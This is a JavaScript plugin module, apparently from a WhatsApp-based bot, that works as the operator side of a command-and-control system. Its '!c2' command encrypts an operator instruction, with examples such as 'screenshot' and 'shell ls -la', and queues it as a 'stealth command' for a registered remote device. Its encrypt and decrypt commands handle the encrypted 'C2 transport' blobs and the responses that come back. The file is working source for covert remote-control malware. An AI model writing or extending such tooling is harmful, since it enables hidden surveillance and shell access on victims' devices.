import { encrypt, decrypt } from '../lib/crypto.js';

export default {
  name: 'crypt',
  commands: ['crypt', 'encrypt', 'decrypt', 'c2', 'd'],
  handler: async (ctx) => {
    const { sock, jid, cmd, args, getDevices, queueCommand } = ctx;

    switch (cmd) {
      case 'c2': {
        const target = getDevices()[0];
        if (!target) return await sock.sendMessage(jid, { text: '❌ No devices registered.' });
        if (!args) return await sock.sendMessage(jid, { text: '📖 *!c2*\nEncrypt and queue stealth command.\nUsage: `!c2 screenshot`\nUsage: `!c2 shell ls -la`' });
        const encrypted = encrypt(args);
        const id = queueCommand(target.device_id, 'c2', encrypted);
        await sock.sendMessage(jid, { text: `🛡️ *Stealth command queued*\n\`${args}\` → \`${target.device_id}\` (#${id})\n\nEncrypted: \`${encrypted}\`` });
        break;
      }

      case 'crypt':
      case 'encrypt': {
        if (!args) return await sock.sendMessage(jid, { text: '📖 *!encrypt <text>*\nEncrypt text for C2 transport.\nReturns base64 blob you can send as \`!c2 <blob>\`' });
        try {
          const result = encrypt(args);
          await sock.sendMessage(jid, { text: `🔒 *Encrypted*\n\n\`${result}\`` });
        } catch (e) {
          await sock.sendMessage(jid, { text: `❌ Encrypt error: ${e.message}` });
        }
        break;
      }

      case 'decrypt':
      case 'd': {
        if (!args) return await sock.sendMessage(jid, { text: '📖 *!decrypt <base64>*\nDecrypt a C2 response (starts with 🔒).\nPaste the base64 after the 🔒.' });
        try {
          const result = decrypt(args.trim());
          await sock.sendMessage(jid, { text: `🔓 *Decrypted*\n\n${result}` });
        } catch (e) {
          await sock.sendMessage(jid, { text: `❌ Decrypt error: ${e.message}\nMake sure you only paste the base64 (after 🔒).` });
        }
        break;
      }
    }
  }
};
